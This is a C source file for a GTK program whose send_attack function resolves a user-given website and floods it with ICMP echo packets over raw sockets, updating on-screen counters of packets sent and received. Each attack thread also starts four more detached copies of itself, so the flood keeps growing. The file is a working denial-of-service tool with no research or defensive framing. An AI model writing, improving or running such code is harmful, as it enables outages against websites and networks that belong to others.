#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <gtk/gtk.h>
#include <pthread.h>
#include "utl.h"
#include <sys/time.h>
#include <sys/types.h>
#include <errno.h>

#define MAX_INT 2147483647

typedef struct {
    GtkWidget *label;
    char message[256];
} LabelUpdateData;

gboolean update_packet_label(gpointer user_data) {
    AttackData *data = (AttackData *)user_data;
    char packet_info[256];

    snprintf(packet_info, sizeof(packet_info), 
             "Packets Sent: %d | Packets Received: %d", 
             data->packets_sent, data->packets_received);

    gtk_label_set_text(GTK_LABEL(data->packet_label), packet_info);
    return FALSE;
}

gboolean update_packet_info_label(gpointer user_data) {
    LabelUpdateData *label_data = (LabelUpdateData *)user_data;
    gtk_label_set_text(GTK_LABEL(label_data->label), label_data->message);
    free(label_data);
    return FALSE;
}

int resolve_hostname(const char *hostname, char *ip_addr) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) {
        perror("getaddrinfo");
        return 1;
    }
    struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
    inet_ntop(AF_INET, &(ipv4->sin_addr), ip_addr, INET_ADDRSTRLEN);
    freeaddrinfo(res);
    return 0;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *send_attack(void *arg) {
    AttackData *data = (AttackData *)arg;
    char *website_name = data->website;
    char ip_addr[INET_ADDRSTRLEN];

    if (resolve_hostname(website_name, ip_addr) != 0) {
        LabelUpdateData *error_label = malloc(sizeof(LabelUpdateData));
        error_label->label = data->output_label;
        strcpy(error_label->message, "Error: Could not resolve hostname");
        g_idle_add(update_packet_info_label, error_label);
        return NULL;
    }
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    int recv_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (recv_sockfd < 0){
		return NULL;
	}
    for (int i = 0; i < 4; i++){
		pthread_t t;
		pthread_create(&t , NULL , send_attack , data);
		pthread_detach(t);
	}

    struct timeval timeout = {1, 0};
    setsockopt(recv_sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(ip_addr);

    int buf_size = 1048576;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    setsockopt(recv_sockfd, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));

    for (int i = 0; i < MAX_INT; i++) {
        char packet[64];
        memset(packet, 0, sizeof(packet));
        struct icmphdr *icmp = (struct icmphdr *)packet;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = htons(getpid() & 0xFFFF);
        icmp->un.echo.sequence = htons(i + 1);
        icmp->checksum = checksum(packet, sizeof(packet));

        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Packet send failed");
            break;
        }

        data->packets_sent++;
        g_idle_add(update_packet_label, data);

        char recv_buffer[1024];
        struct sockaddr_in sender_addr;
        socklen_t sender_len = sizeof(sender_addr);

        if (recvfrom(recv_sockfd, recv_buffer, sizeof(recv_buffer), 0, (struct sockaddr *)&sender_addr, &sender_len) > 0) {
            data->packets_received++;
            g_idle_add(update_packet_label, data);
        }
        usleep(100);
    }

    close(sockfd);
    close(recv_sockfd);
    return NULL;
}
